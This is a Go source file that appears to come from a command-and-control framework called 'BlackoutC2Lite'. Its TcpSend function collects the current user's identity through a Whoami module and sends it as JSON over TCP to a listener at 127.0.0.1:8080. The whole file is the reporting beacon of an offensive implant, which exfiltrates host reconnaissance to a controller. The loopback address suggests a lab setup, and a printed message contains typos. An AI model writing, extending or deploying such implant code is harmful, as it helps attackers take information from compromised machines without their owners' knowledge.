package tcp

import (
	"encoding/json"
	"fmt"
	"net"
	"BlackoutC2Lite/Execution/Whoami"
)



func TcpSend() {
	userStruct := Whoami.Whoami()

	conn, err := net.Dial("tcp", "127.0.0.1:8080")

	if err != nil {
		panic(err)
	}
	defer conn.Close()

	jsonData, err := json.Marshal(userStruct)
	if err != nil {
		fmt.Println("json translate error ", err)
		return
	}

	jsonData = append(jsonData, '\n')
	_, err = conn.Write(jsonData)
	if err != nil {
		fmt.Println("tcp sending error", err)
		return	
	}

	fmt.Println("wgoami sending is complated")

}